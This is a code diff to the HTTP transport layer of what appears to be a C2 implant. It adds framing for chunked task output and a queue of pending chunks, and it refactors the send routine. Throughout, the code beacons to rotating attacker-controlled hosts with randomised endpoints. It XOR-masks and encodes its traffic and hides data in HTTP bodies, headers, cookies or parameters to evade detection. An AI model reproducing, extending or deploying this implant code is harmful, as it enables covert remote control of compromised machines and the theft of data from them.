@@ -8,6 +8,8 @@ using namespace Root;
 
 #define SAFETY_MARGIN 32
 
+#define TASK_HEADER_SIZE ( sizeof(ULONG) + sizeof(CHAR) + 8 + sizeof(ULONG) )
+
 #define APPEND_OBJECTFREE(Ctx, Data) \
     do { \
         PVOID* NewPtr = nullptr; \
@@ -25,7 +27,34 @@ using namespace Root;
         Ctx->ObjectFree.Length++; \
     } while(0)
 
+#define WRITE_BE32(_dst, _val)                                                \
+    do {                                                                      \
+        ((PBYTE)(_dst))[0] = (BYTE)((_val) >> 24);                           \
+        ((PBYTE)(_dst))[1] = (BYTE)((_val) >> 16);                           \
+        ((PBYTE)(_dst))[2] = (BYTE)((_val) >> 8);                            \
+        ((PBYTE)(_dst))[3] = (BYTE)((_val));                                 \
+    } while(0)
+
+#define WRITE_CHUNK( _Buf, _Off, _Prof, _Flag, _TId, _Data, _Len )          \
+    do {                                                                      \
+        ULONG _needed = TASK_HEADER_SIZE + (_Len);                            \
+        (_Buf).Ptr  = (PBYTE)KhReAlloc( (_Buf).Ptr, (_Off) + _needed );      \
+        (_Buf).Size = (_Off) + _needed;                                       \
+        PBYTE _w = (_Buf).Ptr + (_Off);                                       \
+        WRITE_BE32( _w, (_Prof) );    _w += sizeof(ULONG);                    \
+        *(CHAR*)_w  = (_Flag);        _w += sizeof(CHAR);                     \
+        Mem::Copy( _w, (_TId), 8 );   _w += 8;                               \
+        WRITE_BE32( _w, (_Len) );     _w += sizeof(ULONG);                    \
+        Mem::Copy( _w, (_Data), (_Len) );                                     \
+        (_Off) += _needed;                                                    \
+    } while(0)
+
 #if PROFILE_C2 == PROFILE_HTTP
+
+// =============================================================================
+// Strategy Rotation
+// =============================================================================
+
 auto DECLFN Transport::StrategyRot( VOID ) -> HTTP_CALLBACKS* {
     Self->Config.Http.Strategy = DOMAIN_STRATEGY_RANDOM;
 
@@ -65,6 +94,10 @@ auto DECLFN Transport::StrategyRot( VOID ) -> HTTP_CALLBACKS* {
     return TargetCallback;
 }
 
+// =============================================================================
+// Cleanup
+// =============================================================================
+
 auto DECLFN Transport::CleanupHttpContext( 
     _In_ HTTP_CONTEXT* Ctx 
 ) -> BOOL {
@@ -95,6 +128,10 @@ auto DECLFN Transport::CleanupHttpContext(
     
     return Ctx->Success;
 }
+
+// =============================================================================
+// Prepare Method
+// =============================================================================
 
 auto DECLFN Transport::PrepareMethod(
     _In_  HTTP_CALLBACKS* Callback,
@@ -134,6 +171,10 @@ auto DECLFN Transport::PrepareMethod(
     return TRUE;
 }
 
+// =============================================================================
+// Prepare URL
+// =============================================================================
+
 auto DECLFN Transport::PrepareUrl(
     _In_ HTTP_CONTEXT*   Ctx,
     _In_ HTTP_CALLBACKS* Callback,
@@ -168,6 +209,39 @@ auto DECLFN Transport::PrepareUrl(
     KhDbg("Target URL prepared: %ls", Ctx->wTargetUrl);
     return TRUE;
 }
+
+// =============================================================================
+// Get Total Request Size
+// =============================================================================
+
+auto DECLFN Transport::GetTotalRequestSize(
+    _In_ MM_INFO*       SendData,
+    _In_ OUTPUT_FORMAT* ClientOut
+) -> ULONG {
+    switch ( ClientOut->Format ) {
+        case OutputFmt::Base32: {
+            return Self->Pkg->Base32( SendData->Ptr, SendData->Size, nullptr, 0, Base32Action::Get_Size );
+        }
+        case OutputFmt::Base64: {
+            return Self->Pkg->Base64( SendData->Ptr, SendData->Size, nullptr, 0, Base64Action::Get_Size );            
+        }
+        case OutputFmt::Base64Url: {
+            return Self->Pkg->Base64URL( SendData->Ptr, SendData->Size, nullptr, 0, Base64URLAction::Get_Size );
+        }
+        case OutputFmt::Hex: {
+            return Self->Pkg->Hex( SendData->Ptr, SendData->Size, nullptr, 0, HexAction::Get_Size );
+        }
+        case OutputFmt::Raw: {
+            return SendData->Size;
+        }
+        default:
+            return 0;
+    }
+}
+
+// =============================================================================
+// Encode Client Data
+// =============================================================================
 
 auto DECLFN Transport::EncodeClientData( 
     _In_ HTTP_CONTEXT*  Ctx,
@@ -291,6 +365,10 @@ auto DECLFN Transport::EncodeClientData(
     return TRUE;
 }
 
+// =============================================================================
+// Decode Server Data
+// =============================================================================
+
 auto DECLFN Transport::DecodeServerData(
     _In_ HTTP_CONTEXT*  Ctx,
     _In_ MM_INFO*       RespData, 
@@ -351,7 +429,6 @@ auto DECLFN Transport::DecodeServerData(
                 return FALSE;
             }
             
-            // Pass the ALLOCATED size, not the expected decoded size
             SIZE_T ActualDecoded = Self->Pkg->Base64( ParsedPtr, ParsedSize, DecodedData->Ptr, AllocSize, Base64Action::Decode );
             
             if ( ! ActualDecoded ) {
@@ -430,6 +507,10 @@ auto DECLFN Transport::DecodeServerData(
     
     return TRUE;
 }
+
+// =============================================================================
+// Process Client Output
+// =============================================================================
 
 auto DECLFN Transport::ProcessClientOutput(
     _In_ HTTP_CONTEXT*  Ctx,
@@ -1164,7 +1245,7 @@ auto DECLFN Transport::OpenInternetSession(
 }
 
 auto DECLFN Transport::ConnectToServer(
-    _In_ HTTP_CONTEXT* Ctx,
+    _In_ HTTP_CONTEXT*   Ctx,
     _In_ HTTP_CALLBACKS* Callback,
     _In_ BOOL   ProxyEnabled,
     _In_ WCHAR* ProxyUsername,
@@ -1195,7 +1276,7 @@ auto DECLFN Transport::SendHttpRequest(
     _In_ BOOL     Secure
 ) -> BOOL {
     ULONG HttpFlags = INTERNET_FLAG_RELOAD;
-    ULONG OptFlags = 0;
+    ULONG OptFlags  = 0;
     
     if ( Secure ) {
         HttpFlags |= INTERNET_FLAG_SECURE;
@@ -1231,6 +1312,134 @@ auto DECLFN Transport::SendHttpRequest(
     return TRUE;
 }
 
+auto DECLFN Transport::EnqueuePending(
+    _In_ PBYTE Data,
+    _In_ ULONG Size,
+    _In_ PCHAR TaskId,
+    _In_ PCHAR AgentId,
+    _In_ UCHAR ActTask,
+    _In_ PBYTE Header,
+    _In_ ULONG HeaderSize,
+    _In_ BOOL  IsLast
+) -> VOID {
+    KhDbg("EnqueuePending - Size: %lu, ActTask: 0x%02X, IsLast: %s, HeaderSize: %lu",
+        Size, ActTask, IsLast ? "TRUE" : "FALSE", HeaderSize
+    );
+
+    PPENDING_CHUNK Node = (PPENDING_CHUNK)KhAlloc( sizeof(PENDING_CHUNK) );
+    if ( ! Node ) {
+        KhDbg("EnqueuePending - Failed to allocate node");
+        return;
+    }
+
+    Node->Data       = (PBYTE)KhAlloc( Size );
+    Node->Size       = Size;
+    Node->ActTask    = ActTask;
+    Node->HeaderSize = HeaderSize;
+    Node->Header     = nullptr;
+    Node->IsLast     = IsLast;
+    Node->Next       = nullptr;
+
+    if ( ! Node->Data ) {
+        KhDbg("EnqueuePending - Failed to allocate data buffer");
+        KhFree( Node );
+        return;
+    }
+
+    Mem::Copy( Node->Data, Data, Size );
+    Mem::Copy( Node->TaskId, TaskId, 8 );
+    Mem::Copy( Node->AgentId, AgentId, 8 );
+
+    if ( HeaderSize > 0 && Header ) {
+        Node->Header = (PBYTE)KhAlloc( HeaderSize );
+        if ( Node->Header ) {
+            Mem::Copy( Node->Header, Header, HeaderSize );
+        }
+    }
+
+    if ( ! this->PendingChunks ) {
+        this->PendingChunks = Node;
+        return;
+    }
+
+    PPENDING_CHUNK Cur = this->PendingChunks;
+    while ( Cur->Next ) Cur = Cur->Next;
+    Cur->Next = Node;
+}
+
+auto DECLFN Transport::DequeuePending(
+) -> PPENDING_CHUNK {
+    if ( ! this->PendingChunks ) return nullptr;
+
+    PPENDING_CHUNK Node = this->PendingChunks;
+    this->PendingChunks = Node->Next;
+    Node->Next = nullptr;
+    return Node;
+}
+
+auto DECLFN Transport::FreePendingNode(
+    _In_ PPENDING_CHUNK Node
+) -> VOID {
+    if ( !Node ) return;
+    if ( Node->Data )   KhFree( Node->Data );
+    if ( Node->Header ) KhFree( Node->Header );
+    KhFree( Node );
+}
+
+auto DECLFN Transport::ResolveRequest( VOID ) -> BOOL {
+    HTTP_REQUEST_CONFIG* Cfg = &this->RequestConfig;
+
+    Cfg->Resolved = FALSE;
+
+    // Resolve callback (host/port/useragent) via rotation strategy
+    Cfg->Callback = this->StrategyRot();
+    if ( ! Cfg->Callback ) {
+        KhDbg("ResolveRequest - Failed to get callback");
+        return FALSE;
+    }
+
+    KhDbg("ResolveRequest - host: %ls:%d, secure: %s",
+        Cfg->Callback->Host, Cfg->Callback->Port,
+        Self->Config.Http.Secure ? "TRUE" : "FALSE"
+    );
+
+    // Resolve HTTP method (GET/POST)
+    Cfg->MethodStr = nullptr;
+    Mem::Zero( (UPTR)&Cfg->Method, sizeof(HTTP_METHOD) );
+
+    if ( ! this->PrepareMethod( Cfg->Callback, &Cfg->MethodStr, &Cfg->Method ) ) {
+        KhDbg("ResolveRequest - Failed to prepare method");
+        return FALSE;
+    }
+
+    // Resolve endpoint
+    Cfg->Endpoint = Cfg->Method.Endpoints[Rnd32() % Cfg->Method.EndpointCount];
+
+    KhDbg("ResolveRequest - method: %ls, endpoint: %ls", Cfg->MethodStr, Cfg->Endpoint->Path);
+
+    // Cache output formats
+    Cfg->ClientOut     = Cfg->Endpoint->ClientOutput;
+    Cfg->ServerOut     = Cfg->Endpoint->ServerOutput;
+    Cfg->ClientOutType = Cfg->ClientOut.Type;
+    Cfg->ServerOutType = Cfg->ServerOut.Type;
+
+    // Cache connection settings
+    Cfg->Proxy  = Self->Config.Http.Proxy;
+    Cfg->Secure = Self->Config.Http.Secure;
+
+    // Cache max data size
+    Cfg->MaxDataSize = Cfg->ClientOut.MaxDataSize;
+    Cfg->Unlimited   = (Cfg->MaxDataSize == 0);
+
+    KhDbg("ResolveRequest - MaxDataSize: %lu (%s), Mask: %d",
+        Cfg->MaxDataSize, Cfg->Unlimited ? "UNLIMITED" : "LIMITED",
+        Cfg->ClientOut.Mask
+    );
+
+    Cfg->Resolved = TRUE;
+    return TRUE;
+}
+
 auto DECLFN Transport::HttpSend(
     _In_      MM_INFO* SendData,
     _Out_opt_ MM_INFO* RecvData
@@ -1239,138 +1448,124 @@ auto DECLFN Transport::HttpSend(
         RecvData->Ptr  = nullptr;
         RecvData->Size = 0;
     }
-    
-    HTTP_CONTEXT Ctx = { 0 };
-    Ctx.Success = FALSE;
-    
-    HTTP_CALLBACKS* Callback = this->StrategyRot();
-    if ( ! Callback ) {
-        KhDbg("Failed to get C2 callback");
+
+    HTTP_REQUEST_CONFIG* Cfg = &this->RequestConfig;
+    if ( !Cfg->Resolved ) {
+        KhDbg("HttpSend - Config not resolved");
         return FALSE;
     }
-    
-    KhDbg("host: %ls:%d useragent: %ls secure: %s", Callback->Host, Callback->Port, Callback->UserAgent, Self->Config.Http.Secure ? "TRUE" : "FALSE");
-    
-    WCHAR*      MethodStr   = nullptr;
-    HTTP_METHOD Method      = { 0 };
-    MM_INFO     RespData    = { 0 };  
-    MM_INFO     DecodedData = { 0 };  
-    MM_INFO     EncodedData = { 0 };
-    
-    if ( ! this->PrepareMethod( Callback, &MethodStr, &Method ) ) {
-        return CleanupHttpContext( &Ctx );
-    }
-    
-    HTTP_ENDPOINT* Endpoint = Method.Endpoints[Rnd32() % Method.EndpointCount];
-    
-    KhDbg("method: %ls endpoint: %ls", MethodStr, Endpoint->Path);
-    
-    OUTPUT_FORMAT  ClientOut     = Endpoint->ClientOutput;
-    OUTPUT_FORMAT  ServerOut     = Endpoint->ServerOutput;
-    OUTPUT_TYPE    ServerOutType = ServerOut.Type;
-    OUTPUT_TYPE    ClientOutType = ClientOut.Type;
-    PROXY_SETTINGS Proxy         = Self->Config.Http.Proxy;
-    BOOL           Secure        = Self->Config.Http.Secure;
 
-    ULONG TotalRequestSize = 0;
+    HTTP_CONTEXT Ctx = { 0 };
+    Ctx.Success = FALSE;
+    Ctx.Path    = Cfg->Endpoint->Path;
 
-    Ctx.Path = Endpoint->Path;
-    
-    if ( ! this->PrepareUrl( &Ctx, Callback, Secure ) ) {
+    MM_INFO RespData    = { 0 };
+    MM_INFO DecodedData = { 0 };
+    MM_INFO EncodedData = { 0 };
+
+    // Prepare URL
+    if ( ! this->PrepareUrl( &Ctx, Cfg->Callback, Cfg->Secure ) ) {
         return CleanupHttpContext( &Ctx );
     }
 
-    if ( ClientOut.Mask && ! Self->Session.Connected ) {
-        Self->Crp->Xor( SendData->Ptr, SendData->Size - 16 );
-    } else if ( ClientOut.Mask && Self->Session.Connected ) {
-        Self->Crp->Xor( SendData->Ptr, SendData->Size );
-    }
-
-    if ( ! this->EncodeClientData( &Ctx, SendData, &EncodedData, &ClientOut ) ) {
+    // Encode
+    if ( ! this->EncodeClientData( &Ctx, SendData, &EncodedData, &Cfg->ClientOut ) ) {
         return CleanupHttpContext( &Ctx );
     }
 
-    TotalRequestSize = ( EncodedData.Size + ClientOut.Append.Size + ClientOut.Prepend.Size );
-    
-    if ( ! this->ProcessClientOutput( &Ctx, &EncodedData, ClientOutType, Endpoint, &Method, &ClientOut ) ) {
+    // Process client output (body/header/cookie/parameter)
+    if ( ! this->ProcessClientOutput( &Ctx, &EncodedData, Cfg->ClientOutType, Cfg->Endpoint, &Cfg->Method, &Cfg->ClientOut ) ) {
         return CleanupHttpContext( &Ctx );
     }
-    
-    if ( ! this->OpenInternetSession( &Ctx, Callback, Proxy.Enabled, Proxy.Url ) ) {
+
+    // Open session
+    if ( ! this->OpenInternetSession( &Ctx, Cfg->Callback, Cfg->Proxy.Enabled, Cfg->Proxy.Url ) ) {
         return CleanupHttpContext( &Ctx );
     }
-    
-    if ( ! this->ConnectToServer( &Ctx, Callback, Proxy.Enabled, Proxy.Username, Proxy.Password ) ) {
+
+    // Connect
+    if ( ! this->ConnectToServer( &Ctx, Cfg->Callback, Cfg->Proxy.Enabled, Cfg->Proxy.Username, Cfg->Proxy.Password ) ) {
         return CleanupHttpContext( &Ctx );
     }
-    
-    if ( Method.CookiesCount ) {
-        for ( int i = 0; i < Method.CookiesCount; i++ ) {
-            Self->Wininet.InternetSetCookieW( Ctx.wTargetUrl, Method.Cookies[i]->Key, Method.Cookies[i]->Value );
-            KhDbg("Cookie set - Key: %ls", Method.Cookies[i]->Key);
+
+    // Set cookies
+    if ( Cfg->Method.CookiesCount ) {
+        for ( int i = 0; i < Cfg->Method.CookiesCount; i++ ) {
+            Self->Wininet.InternetSetCookieW(
+                Ctx.wTargetUrl,
+                Cfg->Method.Cookies[i]->Key,
+                Cfg->Method.Cookies[i]->Value
+            );
         }
     }
-    
-    if ( ! this->SendHttpRequest( 
-        &Ctx, MethodStr, Ctx.Path ? Ctx.Path : Endpoint->Path,
-        Ctx.Headers ? Ctx.Headers : Method.Headers, &Ctx.Body, Secure
+
+    // Send
+    if ( !this->SendHttpRequest(
+        &Ctx, Cfg->MethodStr,
+        Ctx.Path ? Ctx.Path : Cfg->Endpoint->Path,
+        Ctx.Headers ? Ctx.Headers : Cfg->Method.Headers,
+        &Ctx.Body, Cfg->Secure
     )) {
         return CleanupHttpContext( &Ctx );
     }
-    
+
+    KhDbg("HttpSend - Request sent, Size: %lu", SendData->Size);
+
     ULONG HttpStatusCode = 0;
-    ULONG HttpStatusSize = sizeof( HttpStatusCode );
-    
+    ULONG HttpStatusSize = sizeof(HttpStatusCode);
+
     Self->Wininet.HttpQueryInfoW(
-        Ctx.RequestHandle, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER,
+        Ctx.RequestHandle,
+        HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER,
         &HttpStatusCode, &HttpStatusSize, nullptr
     );
-    
-    KhDbg("HTTP status code: %lu", HttpStatusCode);
-    
+
+    KhDbg("HttpSend - Status: %lu", HttpStatusCode);
+
     if ( HttpStatusCode < 200 || HttpStatusCode >= 300 ) {
-        KhDbg("HTTP request failed - Status: %lu", HttpStatusCode);
-        return CleanupHttpContext( &Ctx );
-    }
-    
-    if ( ! this->ProcessServerOutput( &Ctx, Ctx.RequestHandle, Ctx.cTargetUrl, ServerOutType, &ServerOut, &RespData ) ) {
+        KhDbg("HttpSend - Failed, Status: %lu", HttpStatusCode);
         return CleanupHttpContext( &Ctx );
     }
 
-    if ( RespData.Ptr && RespData.Size == Method.DoNothingBuff.Size ) {
-        if ( RespData.Size == 0 || Mem::Cmp( RespData.Ptr, Method.DoNothingBuff.Ptr, Method.DoNothingBuff.Size ) ) {
-            KhDbg("Response matches do-nothing buffer");
-            
+    if ( ! this->ProcessServerOutput(
+        &Ctx, Ctx.RequestHandle, Ctx.cTargetUrl,
+        Cfg->ServerOutType, &Cfg->ServerOut, &RespData
+    )) {
+        return CleanupHttpContext( &Ctx );
+    }
+
+    // Check do-nothing response
+    if ( RespData.Ptr && RespData.Size == Cfg->Method.DoNothingBuff.Size ) {
+        if ( RespData.Size == 0 ||
+             Mem::Cmp( RespData.Ptr, Cfg->Method.DoNothingBuff.Ptr, Cfg->Method.DoNothingBuff.Size ) )
+        {
+            KhDbg("HttpSend - Do-nothing response");
             KhFree( RespData.Ptr );
-            RespData.Ptr = nullptr;
-            
             Ctx.Success = TRUE;
             return CleanupHttpContext( &Ctx );
         }
     }
-    
-    if ( ! this->DecodeServerData( &Ctx, &RespData, &DecodedData, &ServerOut ) ) {
+
+    // Decode
+    if ( ! this->DecodeServerData( &Ctx, &RespData, &DecodedData, &Cfg->ServerOut ) ) {
         KhFree( RespData.Ptr );
         return CleanupHttpContext( &Ctx );
     }
 
-    if ( ServerOut.Mask ) {
+    if ( Cfg->ServerOut.Mask ) {
         Self->Crp->Xor( DecodedData.Ptr, DecodedData.Size );
     }
-    
+
     KhFree( RespData.Ptr );
-    RespData.Ptr = nullptr;
-        
+
     if ( RecvData ) {
         RecvData->Ptr  = DecodedData.Ptr;
         RecvData->Size = DecodedData.Size;
-        KhDbg("Response returned - Size: %zu", DecodedData.Size);
+        KhDbg("HttpSend - Response: %zu bytes", DecodedData.Size);
     } else {
-        if ( DecodedData.Ptr ) {
-            KhFree( DecodedData.Ptr );
-        }
+        if ( DecodedData.Ptr ) KhFree( DecodedData.Ptr );
     }
-    
+
     Ctx.Success = TRUE;
     return CleanupHttpContext( &Ctx );
 }
